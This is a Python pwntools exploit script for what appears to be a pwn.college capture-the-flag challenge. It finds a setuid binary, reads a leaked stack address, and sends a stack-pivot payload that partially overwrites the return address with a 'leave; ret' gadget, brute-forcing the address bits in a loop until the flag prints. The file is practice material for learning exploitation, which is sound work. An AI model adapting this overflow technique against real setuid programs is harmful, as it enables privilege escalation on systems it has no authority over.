import re
import sys
import pwn

pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])


def tee[T: pwn.tube](process: T) -> T:
    import sys

    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    from pathlib import Path
    import os
    import stat

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


def ctf():
    bin = find_challenge()

    io: pwn.process
    if "gdb" in sys.argv:
        io = pwn.gdb.debug(
            bin,
            gdbscript="""
            source /opt/gef/gef.py
            b *challenge+538
            b *challenge+696
            """,
        )
    else:
        io = pwn.process(bin)
    tee(io)

    io.recvuntil(b"[LEAK] Your input buffer is located at: ")
    if not (m := re.match(rb"(0x[0-9a-fA-F]+)\.", io.recvline())):
        raise ValueError("failed to parse input buffer address")
    buff_ptr = int(m.group(1), 16)

    pwin_rip = buff_ptr - 0x8
    pwin_rbp = pwin_rip - 0x8

    payload = pwn.flat(
        {
            0x78: pwin_rbp,
            0x80: 0x14AE.to_bytes(2, "little"),  # address of leave; ret
        }
    )
    io.send(payload)

    if b"pwn.college{" in io.recvrepeat():
        pwn.success("Found the flag!")
        exit(0)


if __name__ == "__main__":
    for nibble in range(0x100):
        ctf()
